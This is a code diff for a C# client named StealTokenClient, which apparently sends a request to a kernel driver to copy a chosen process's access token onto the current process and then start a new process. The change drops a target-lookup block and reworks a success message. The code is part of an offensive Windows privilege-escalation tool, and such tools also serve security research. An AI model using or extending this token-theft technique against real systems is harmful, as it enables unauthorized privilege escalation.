@@ -12,26 +12,11 @@ namespace StealTokenClient.Library
         public static bool CreateTokenStealedProcess(int srcPid, string command)
         {
             NTSTATUS ntstatus;
-            string processName;
             var dstPid = (uint)Process.GetCurrentProcess().Id;
             var bSuccess = false;
             var info = new STEAL_TOKEN_INPUT { SourcePid = (uint)srcPid, DestinationPid = dstPid };
             IntPtr pInBuffer = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(STEAL_TOKEN_INPUT)));
             Marshal.StructureToPtr(info, pInBuffer, true);
-
-            try
-            {
-                processName = Process.GetProcessById(srcPid).ProcessName;
-
-                Console.WriteLine("[*] Target process information.");
-                Console.WriteLine("    [*] Process ID   : {0}", srcPid);
-                Console.WriteLine("    [*] Process Name : {0}", processName);
-            }
-            catch
-            {
-                Console.WriteLine("[-] Failed to find the specified process.");
-                return false;
-            }
 
             Console.WriteLine("[>] Sending a query to {0}.", Globals.SYMLINK_PATH);
 
@@ -91,7 +76,7 @@ namespace StealTokenClient.Library
                 }
                 else
                 {
-                    Console.WriteLine("[+] Token stealing from the target process is successful.");
+                    Console.WriteLine("[+] Token stealing from PID {0} to {1} is successful.", srcPid, dstPid);
                 }
 
                 Console.WriteLine("[>] Trying to create new process.");
